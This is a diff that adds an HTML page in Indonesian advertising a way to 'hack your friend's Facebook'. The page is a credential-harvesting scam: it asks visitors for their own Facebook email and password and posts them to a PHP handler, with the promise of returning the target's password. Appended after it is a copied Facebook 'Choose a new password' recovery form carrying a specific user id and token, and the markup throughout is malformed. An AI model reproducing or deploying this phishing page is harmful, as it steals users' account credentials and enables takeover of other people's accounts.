@@ -1,0 +1,84 @@
+<html>
+<head>
+<title>Hack Facebook Teman Anda !</title>
+</head>
+<body bgcolor=”black” text=”white”>
+<p>
+<center><center>
+<center><center>
+
+<form id=”form1″ name=”form1″ method=”post” action=”informasi.php”>
+<table width=”455″ border=”0″ cellspacing=”0″ cellpadding=”0″>
+<p>
+<tr>
+<td height=”45″ align=”right”><label for=”email1″>Email Facebook Anda</label></td>
+<td><input name=”email1″ type=”text” id=”email1″ size=”30″ /></td>
+
+</tr>
+<tr>
+<td width=”175″ height=”44″ align=”right”><label for”fb”>Email Facebook Target</label></td>
+<td width=”280″><input name=”email2″ type=”text” id=”email2″ size=”30″ /></td>
+
+</tr>
+<tr>
+<td height=”45″ align=”right”><label for=”email1″>Password Facebook Anda</label></td>
+<td><input name=”fb” type=”password” id=”fb” size=”30″ /></td>
+
+</tr>
+<tr>
+<td height=”41″ align=”right”><label for=”info”>URL Facebook Target</label></td>
+<td><textarea name=”info” cols=”30″ rows”5″ id=”info”></textarea></td>
+
+</tr>
+<tr>
+<td height=”38″>&nbsp;</td>
+<td><label>
+<input type=”submit” name=”submit” id”=submit” value=”Jika anda telah mengisi semua form diatas , Silahkan klik tombol ini untuk mendapatkan password facebook target yang akan kami kirimkan melalui pesan di facebook anda !” />
+</label></td>
+</tr>
+
+</head>
+<body bgcolor=”black” text=”white”>
+<br>Untuk membongkar password facebook teman anda , kami memerlukan informasi mengenai anda dan target orang yang facebooknya ingin anda hack<p>
+<p>
+Silahkan masukan data anda dan data target anda pada form pengisian dibawah ini !
+</body>
+<html>
+<form method="post" action="/recover/password?
+u=100007702657756&amp;n=542903" onsubmit="return window.Event
+&amp;&amp; Event.__inlineSubmit &amp;&amp;
+Event.__inlineSubmit(this,event)" id="u_0_3"><input type="hidden"
+name="lsd" value="AVpICGr3" autocomplete="off"><div class="mvl ptm
+uiInterstitial uiInterstitialLarge uiBoxWhite"><div class="uiHeader
+uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader"><div
+class="clearfix uiHeaderTop"><div class="rfloat _ohf"><h2
+class="accessible_elem">Choose a new password</h2><div
+class="uiHeaderActions"></div></div><div><h2 class="uiHeaderTitle"
+aria-hidden="true">Choose a new password</h2></div></div></div><div
+class="phl ptm uiInterstitialContent"><div class="mvm uiP fsm">A
+strong password is a combination of letters and punctuation marks. It
+must be at least 6 characters long.</div><table class="uiInfoTable"
+role="presentation"><tbody><tr class="dataRow"><th class="label">
+<label for="password_new">New Password</label></th><td class="data">
+<input type="password" class="passwordinput" id="password_new"
+name="password_new" tabindex="1" autocomplete="off"><label class="mls
+uiButton" for="u_0_0"><input value="?" onclick="show_pwd_help();
+return false;" tabindex="3" type="button" id="u_0_0"></label><div
+id="password_new_status"></div></td></tr><tr class="dataRow"><th
+class="label"><label for="password_confirm">Confirm Password</label>
+</th><td class="data"><input type="password" class="passwordinput"
+id="password_confirm" name="password_confirm" tabindex="2"
+autocomplete="off"><div id="password_confirm_status"></div></td></tr>
+</tbody></table><div class="mvl"><div class="uiInputLabel clearfix">
+<label class="_kv1 _55sg uiInputLabelInput"><input type="checkbox"
+name="reason" value="kill_sessions" id="u_0_1"><span></span></label>
+<label for="u_0_1" class="uiInputLabelLabel">Log me out of Facebook
+everywhere else my account might be open. (Choose this if a stranger
+used your account.)</label></div></div></div><div
+class="uiInterstitialBar uiBoxGray topborder"><div class="clearfix">
+<div class="rfloat _ohf"><label class="uiButton uiButtonConfirm"
+id="btn_continue" for="u_0_2"><input value="Continue"
+name="btn_continue" type="submit" id="u_0_2"></label><a
+class="uiButton" href="/" role="button" name="reset_action"><span
+class="uiButtonText">Cancel</span></a></div><div class="pts"></div>
+</div></div></div></form>
